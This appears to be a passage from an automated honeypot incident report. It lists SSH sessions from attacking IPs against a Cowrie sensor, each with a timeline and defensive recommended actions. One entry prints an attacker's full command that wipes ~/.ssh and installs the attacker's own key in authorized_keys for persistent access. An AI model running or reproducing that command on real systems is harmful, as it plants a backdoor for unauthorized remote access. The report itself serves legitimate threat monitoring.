| `2026-09-11 04:45:17` | `cowrie.session.connect` |
| `2026-09-11 04:45:17` | `cowrie.client.version` |
| `2026-09-11 04:45:17` | `cowrie.client.kex` |
| `2026-09-11 04:45:17` | `cowrie.login.success` |
| `2026-09-11 04:45:19` | `cowrie.session.params` |
| `2026-09-11 04:45:19` | `cowrie.command.input` |
| `2026-09-11 04:45:19` | `cowrie.session.file_download` |
| `2026-09-11 04:45:19` | `cowrie.session.file_download` |
| `2026-09-11 04:45:19` | `cowrie.log.closed` |
| `2026-09-11 04:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d524379cb6f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-11 05:01 |
| **Last Seen** | 2026-09-11 05:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:01:33` | `cowrie.session.connect` |
| `2026-09-11 05:01:33` | `cowrie.client.version` |
| `2026-09-11 05:01:33` | `cowrie.client.kex` |
| `2026-09-11 05:01:34` | `cowrie.login.success` |
| `2026-09-11 05:01:36` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:01:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:01:36` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:01:37` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:01:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:01:39` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:01:40` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:01:40` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:01:40` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03a1b468167

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-11 05:03 |
| **Last Seen** | 2026-09-11 05:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:03:19` | `cowrie.session.connect` |
| `2026-09-11 05:03:19` | `cowrie.client.version` |
| `2026-09-11 05:03:19` | `cowrie.client.kex` |
| `2026-09-11 05:03:19` | `cowrie.login.success` |
| `2026-09-11 05:03:20` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:03:21` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:03:21` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:03:21` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:03:22` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:03:22` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:03:23` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:03:23` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:03:23` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e594d1179afb

| Field | Detail |
|---|---|
| **Source IP** | `207.175.13[.]248` |
| **First Seen** | 2026-09-11 05:07 |
| **Last Seen** | 2026-09-11 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:07:49` | `cowrie.session.connect` |
| `2026-09-11 05:07:49` | `cowrie.login.success` |
| `2026-09-11 05:07:50` | `cowrie.session.params` |
| `2026-09-11 05:07:50` | `cowrie.command.input` |
| `2026-09-11 05:07:50` | `cowrie.command.input` |
| `2026-09-11 05:07:50` | `cowrie.command.failed` |
| `2026-09-11 05:07:50` | `cowrie.command.input` |
| `2026-09-11 05:07:50` | `cowrie.log.closed` |
| `2026-09-11 05:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.13[.]248` to AbuseIPDB if not already reported
- [ ] Block `207.175.13[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddbba6d2658f

| Field | Detail |
|---|---|
| **Source IP** | `207.175.13[.]248` |
| **First Seen** | 2026-09-11 05:07 |
| **Last Seen** | 2026-09-11 05:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:07:58` | `cowrie.session.connect` |
| `2026-09-11 05:07:58` | `cowrie.login.success` |
| `2026-09-11 05:07:58` | `cowrie.session.params` |
| `2026-09-11 05:07:58` | `cowrie.command.input` |
| `2026-09-11 05:07:58` | `cowrie.command.failed` |
| `2026-09-11 05:08:00` | `cowrie.log.closed` |
| `2026-09-11 05:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.13[.]248` to AbuseIPDB if not already reported
- [ ] Block `207.175.13[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334b0f9c4682

| Field | Detail |
|---|---|
| **Source IP** | `207.175.13[.]248` |
| **First Seen** | 2026-09-11 05:08 |
| **Last Seen** | 2026-09-11 05:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:08:00` | `cowrie.session.connect` |
| `2026-09-11 05:08:00` | `cowrie.login.success` |
| `2026-09-11 05:08:00` | `cowrie.session.params` |
| `2026-09-11 05:08:00` | `cowrie.command.input` |
| `2026-09-11 05:08:13` | `cowrie.log.closed` |
| `2026-09-11 05:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.13[.]248` to AbuseIPDB if not already reported
- [ ] Block `207.175.13[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcee12130ad4

| Field | Detail |
|---|---|
| **Source IP** | `173.212.223[.]184` |
| **First Seen** | 2026-09-11 05:13 |
| **Last Seen** | 2026-09-11 05:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:13:44` | `cowrie.session.connect` |
| `2026-09-11 05:13:45` | `cowrie.client.version` |
| `2026-09-11 05:13:45` | `cowrie.client.kex` |
| `2026-09-11 05:13:46` | `cowrie.login.success` |
| `2026-09-11 05:13:47` | `cowrie.session.params` |
| `2026-09-11 05:13:47` | `cowrie.command.input` |
| `2026-09-11 05:13:47` | `cowrie.log.closed` |
| `2026-09-11 05:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.223[.]184` to AbuseIPDB if not already reported
- [ ] Block `173.212.223[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cab9813afdfb

| Field | Detail |
|---|---|
| **Source IP** | `123.131.17[.]131` |
| **First Seen** | 2026-09-11 05:31 |
| **Last Seen** | 2026-09-11 05:33 |
| **Session Duration** | 144s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:31:14` | `cowrie.session.connect` |
| `2026-09-11 05:31:14` | `cowrie.client.version` |
| `2026-09-11 05:31:15` | `cowrie.client.kex` |
| `2026-09-11 05:31:15` | `cowrie.login.success` |
| `2026-09-11 05:33:39` | `cowrie.session.file_upload` |
| `2026-09-11 05:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.131.17[.]131` to AbuseIPDB if not already reported
- [ ] Block `123.131.17[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14187d45e634

| Field | Detail |
|---|---|
| **Source IP** | `207.175.145[.]232` |
| **First Seen** | 2026-09-11 05:45 |
| **Last Seen** | 2026-09-11 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:45:07` | `cowrie.session.connect` |
| `2026-09-11 05:45:07` | `cowrie.login.success` |
| `2026-09-11 05:45:07` | `cowrie.session.params` |
| `2026-09-11 05:45:07` | `cowrie.command.input` |
| `2026-09-11 05:45:07` | `cowrie.command.input` |
| `2026-09-11 05:45:07` | `cowrie.command.failed` |
| `2026-09-11 05:45:07` | `cowrie.command.input` |
| `2026-09-11 05:45:07` | `cowrie.log.closed` |
| `2026-09-11 05:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.145[.]232` to AbuseIPDB if not already reported
- [ ] Block `207.175.145[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99502ff11ef

| Field | Detail |
|---|---|
| **Source IP** | `207.175.145[.]232` |
| **First Seen** | 2026-09-11 05:45 |
| **Last Seen** | 2026-09-11 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:45:20` | `cowrie.session.connect` |
| `2026-09-11 05:45:20` | `cowrie.login.success` |
| `2026-09-11 05:45:21` | `cowrie.session.params` |
| `2026-09-11 05:45:21` | `cowrie.command.input` |
| `2026-09-11 05:45:21` | `cowrie.command.failed` |
| `2026-09-11 05:45:22` | `cowrie.log.closed` |
| `2026-09-11 05:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.145[.]232` to AbuseIPDB if not already reported
- [ ] Block `207.175.145[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849ecd01bf21

| Field | Detail |
|---|---|
| **Source IP** | `207.175.145[.]232` |
| **First Seen** | 2026-09-11 05:45 |
| **Last Seen** | 2026-09-11 05:45 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:45:22` | `cowrie.session.connect` |
| `2026-09-11 05:45:22` | `cowrie.login.success` |
| `2026-09-11 05:45:23` | `cowrie.session.params` |
| `2026-09-11 05:45:23` | `cowrie.command.input` |
| `2026-09-11 05:45:37` | `cowrie.log.closed` |
| `2026-09-11 05:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.145[.]232` to AbuseIPDB if not already reported
- [ ] Block `207.175.145[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a1341c0453

| Field | Detail |
|---|---|
| **Source IP** | `203.135.42[.]52` |
| **First Seen** | 2026-09-11 05:45 |
| **Last Seen** | 2026-09-11 05:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:45:55` | `cowrie.session.connect` |
| `2026-09-11 05:45:55` | `cowrie.client.version` |
| `2026-09-11 05:45:56` | `cowrie.client.kex` |
| `2026-09-11 05:45:57` | `cowrie.login.success` |
| `2026-09-11 05:45:58` | `cowrie.session.params` |
| `2026-09-11 05:45:58` | `cowrie.command.input` |
| `2026-09-11 05:45:58` | `cowrie.command.failed` |
| `2026-09-11 05:45:58` | `cowrie.log.closed` |
| `2026-09-11 05:45:59` | `cowrie.session.params` |
| `2026-09-11 05:45:59` | `cowrie.command.input` |
| `2026-09-11 05:45:59` | `cowrie.session.file_download` |
| `2026-09-11 05:45:59` | `cowrie.log.closed` |
| `2026-09-11 05:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.135.42[.]52` to AbuseIPDB if not already reported
- [ ] Block `203.135.42[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014a949167ec

| Field | Detail |
|---|---|
| **Source IP** | `203.135.42[.]52` |
| **First Seen** | 2026-09-11 05:45 |
| **Last Seen** | 2026-09-11 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:45:59` | `cowrie.session.connect` |
| `2026-09-11 05:45:59` | `cowrie.client.version` |
| `2026-09-11 05:46:00` | `cowrie.client.kex` |
| `2026-09-11 05:46:00` | `cowrie.login.success` |
| `2026-09-11 05:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.135.42[.]52` to AbuseIPDB if not already reported
- [ ] Block `203.135.42[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcd554e88e0

| Field | Detail |
|---|---|
| **Source IP** | `203.135.42[.]52` |
| **First Seen** | 2026-09-11 05:46 |
| **Last Seen** | 2026-09-11 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:46:01` | `cowrie.session.connect` |
| `2026-09-11 05:46:01` | `cowrie.client.version` |
| `2026-09-11 05:46:01` | `cowrie.client.kex` |
| `2026-09-11 05:46:02` | `cowrie.login.success` |
| `2026-09-11 05:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.135.42[.]52` to AbuseIPDB if not already reported
- [ ] Block `203.135.42[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9f68476abf

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-11 05:46 |
| **Last Seen** | 2026-09-11 05:46 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:46:31` | `cowrie.session.connect` |
| `2026-09-11 05:46:31` | `cowrie.client.version` |
| `2026-09-11 05:46:31` | `cowrie.client.kex` |
| `2026-09-11 05:46:31` | `cowrie.login.success` |
| `2026-09-11 05:46:36` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:46:37` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:46:37` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:46:41` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:46:42` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:46:42` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:46:44` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:46:45` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:46:45` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36b971fb6347

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-11 05:49 |
| **Last Seen** | 2026-09-11 05:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:49:51` | `cowrie.session.connect` |
| `2026-09-11 05:49:51` | `cowrie.client.version` |
| `2026-09-11 05:49:51` | `cowrie.client.kex` |
| `2026-09-11 05:49:53` | `cowrie.login.success` |
| `2026-09-11 05:49:54` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba72e346dfd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-11 05:51 |
| **Last Seen** | 2026-09-11 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:51:22` | `cowrie.session.connect` |
| `2026-09-11 05:51:22` | `cowrie.client.version` |
| `2026-09-11 05:51:22` | `cowrie.client.kex` |
| `2026-09-11 05:51:22` | `cowrie.login.success` |
| `2026-09-11 05:51:23` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:51:23` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ae5d06013d

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-11 05:51 |
| **Last Seen** | 2026-09-11 05:52 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:51:44` | `cowrie.session.connect` |
| `2026-09-11 05:51:44` | `cowrie.client.version` |
| `2026-09-11 05:51:44` | `cowrie.client.kex` |
| `2026-09-11 05:51:44` | `cowrie.login.success` |
| `2026-09-11 05:51:48` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:51:49` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:51:49` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:51:50` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:51:51` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:51:51` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:51:59` | `cowrie.direct-tcpip.request` |
| `2026-09-11 05:52:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 05:52:02` | `cowrie.direct-tcpip.data` |
| `2026-09-11 05:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ac14745151

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 05:56 |
| **Last Seen** | 2026-09-11 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:56:28` | `cowrie.session.connect` |
| `2026-09-11 05:56:28` | `cowrie.client.version` |
| `2026-09-11 05:56:28` | `cowrie.client.kex` |
| `2026-09-11 05:56:29` | `cowrie.login.success` |
| `2026-09-11 05:56:29` | `cowrie.session.params` |
| `2026-09-11 05:56:29` | `cowrie.command.input` |
| `2026-09-11 05:56:30` | `cowrie.log.closed` |
| `2026-09-11 05:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c817db0988

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 05:59 |
| **Last Seen** | 2026-09-11 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 05:59:01` | `cowrie.session.connect` |
| `2026-09-11 05:59:01` | `cowrie.client.version` |
| `2026-09-11 05:59:01` | `cowrie.client.kex` |
| `2026-09-11 05:59:01` | `cowrie.login.success` |
| `2026-09-11 05:59:02` | `cowrie.session.params` |
| `2026-09-11 05:59:02` | `cowrie.command.input` |
| `2026-09-11 05:59:02` | `cowrie.log.closed` |
| `2026-09-11 05:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff1a2b1b4b14

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:01 |
| **Last Seen** | 2026-09-11 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:01:36` | `cowrie.session.connect` |
| `2026-09-11 06:01:36` | `cowrie.client.version` |
| `2026-09-11 06:01:36` | `cowrie.client.kex` |
| `2026-09-11 06:01:36` | `cowrie.login.success` |
| `2026-09-11 06:01:37` | `cowrie.session.params` |
| `2026-09-11 06:01:37` | `cowrie.command.input` |
| `2026-09-11 06:01:37` | `cowrie.log.closed` |
| `2026-09-11 06:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d05e91a89ae

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:04 |
| **Last Seen** | 2026-09-11 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:04:01` | `cowrie.session.connect` |
| `2026-09-11 06:04:01` | `cowrie.client.version` |
| `2026-09-11 06:04:02` | `cowrie.client.kex` |
| `2026-09-11 06:04:02` | `cowrie.login.success` |
| `2026-09-11 06:04:02` | `cowrie.session.params` |
| `2026-09-11 06:04:02` | `cowrie.command.input` |
| `2026-09-11 06:04:03` | `cowrie.log.closed` |
| `2026-09-11 06:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c27eda65ecd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:06 |
| **Last Seen** | 2026-09-11 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:06:30` | `cowrie.session.connect` |
| `2026-09-11 06:06:30` | `cowrie.client.version` |
| `2026-09-11 06:06:30` | `cowrie.client.kex` |
| `2026-09-11 06:06:31` | `cowrie.login.success` |
| `2026-09-11 06:06:32` | `cowrie.session.params` |
| `2026-09-11 06:06:32` | `cowrie.command.input` |
| `2026-09-11 06:06:32` | `cowrie.log.closed` |
| `2026-09-11 06:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881b5c3965de

| Field | Detail |
|---|---|
| **Source IP** | `36.41.186[.]9` |
| **First Seen** | 2026-09-11 06:08 |
| **Last Seen** | 2026-09-11 06:08 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:08:19` | `cowrie.session.connect` |
